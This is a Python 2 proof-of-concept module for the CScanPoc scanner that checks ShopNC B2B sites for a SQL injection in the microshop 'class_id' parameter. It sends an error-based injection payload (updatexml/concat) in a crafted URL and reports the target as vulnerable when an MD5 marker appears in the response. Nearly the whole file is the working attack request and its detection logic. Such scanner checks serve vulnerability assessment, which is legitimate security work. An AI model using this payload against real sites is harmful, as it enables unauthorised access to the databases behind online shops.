# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '76117a01-f93e-4e89-9cf2-bd3ce80f83c9'
    name = 'ShopNC B2B版SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-10-04'  # 漏洞公布时间
    desc = '''
        shopNC B2B版SQL注入
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0124172' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'ShopNC'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'Unkonwn' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url=arg+"/microshop/index.php?act=personal&class_id[0]=exp&class_id[1]=1)%20or%20updatexml(1,concat(0x5c,md5(1)),1)%23"
            code,head,res,errcode,finalurl=hh.http(url)
            if code==200 and  "c4ca4238a0b923820dcc509a6f75849" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()